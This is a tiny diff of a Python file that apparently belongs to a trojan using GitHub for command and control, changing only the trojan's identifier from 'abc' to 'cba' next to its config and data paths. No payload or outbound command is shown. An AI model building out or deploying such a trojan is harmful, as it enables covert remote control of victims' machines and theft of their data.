@@ -8,7 +8,7 @@ import threading
 import queue
 from github3 import login
 
-trojan_id = "abc"
+trojan_id = "cba"
 trojan_config = "config/{}.json".format(trojan_id)
 data_path = "data/{}/".format(trojan_id)
 trojan_modules = []
